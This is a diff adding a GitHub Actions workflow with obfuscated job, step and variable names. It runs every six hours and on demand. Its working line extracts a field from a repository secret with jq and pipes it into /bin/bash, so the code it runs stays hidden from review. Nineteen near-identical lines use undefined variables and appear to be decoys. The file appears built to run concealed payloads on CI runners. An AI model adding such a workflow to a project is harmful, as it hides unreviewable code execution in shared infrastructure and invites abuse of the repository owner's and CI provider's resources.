@@ -1,0 +1,35 @@
+name: youwentizat
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '20 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: youwentizat
+        env:
+          ixii384: ${{ secrets.ixii384 }}
+        run: |
+          echo $ixii384 | jq -r .dj27449 | /bin/bash
+          echo $c4738 | jq -r .lqn316 | /bin/bash
+          echo $azkl90 | jq -r .gavpo9 | /bin/bash
+          echo $kke373 | jq -r .xzex307 | /bin/bash
+          echo $fcej9582 | jq -r .gddns54 | /bin/bash
+          echo $gni8 | jq -r .wz81001 | /bin/bash
+          echo $uw7 | jq -r .r4 | /bin/bash
+          echo $uifo8 | jq -r .o27 | /bin/bash
+          echo $ati7764 | jq -r .c865 | /bin/bash
+          echo $cxi12145 | jq -r .or6446 | /bin/bash
+          echo $qoxhv8200 | jq -r .awo83 | /bin/bash
+          echo $jujl8149 | jq -r .ctzd77 | /bin/bash
+          echo $bhfaa503 | jq -r .byqfj78585 | /bin/bash
+          echo $btkyc79 | jq -r .wjd05933 | /bin/bash
+          echo $c53 | jq -r .tdrnm36030 | /bin/bash
+          echo $cs9 | jq -r .jgr633 | /bin/bash
+          echo $mmdo52059 | jq -r .ng1111 | /bin/bash
+          echo $bant4865 | jq -r .hlu34 | /bin/bash
+          echo $h8 | jq -r .xjx17355 | /bin/bash
+          echo $dqru78408 | jq -r .a60 | /bin/bash
+
